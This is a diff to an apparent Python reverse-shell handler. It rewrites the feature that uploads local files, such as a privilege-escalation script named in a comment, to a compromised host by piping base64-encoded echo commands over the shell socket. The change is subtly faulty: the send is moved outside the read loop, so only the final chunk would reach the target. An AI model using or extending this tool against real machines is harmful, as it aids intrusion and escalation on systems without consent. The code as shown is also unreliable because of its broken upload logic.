@@ -6,6 +6,8 @@ import shlex
 import socket
 import struct
 import random
+import subprocess
+import base64
 
 def main(port, interface):
     persistent = False
@@ -391,17 +393,19 @@ class RSH:
 
             print("[+] Uploading %s.." % localfile)
 
-            self.sock.send("/bin/echo -n '' > %s\n" % remotefile) # Pb here (special char in privesc script that triggers a syntax error)
+            self.sock.send("/bin/echo -n '' > %s\n" % remotefile)
             self.sock.receive()
 
-            file = open(localfile, 'r')
+            
+            file = open(localfile, 'rb')
             while True:
                 chunk = file.read(1024)
                 if not chunk: 
                     break
-                #print(repr(chunk))
-                self.sock.send("/bin/echo -en %s >> %s\n" % (repr(chunk), remotefile))
-                self.sock.receive()
+                chunk = base64.b64encode(chunk)
+                message = chunk.decode(encoding='utf-8')
+            self.sock.send("/bin/echo -en %s | base64 -d >> %s\n" % (str(message), remotefile)) # Pb here (special char in privesc script that triggers a syntax error)
+            self.sock.receive()
             file.close()
 
             print("[+] Successfully uploaded file to %s!" % remotefile.replace("$(pwd)/", ""))
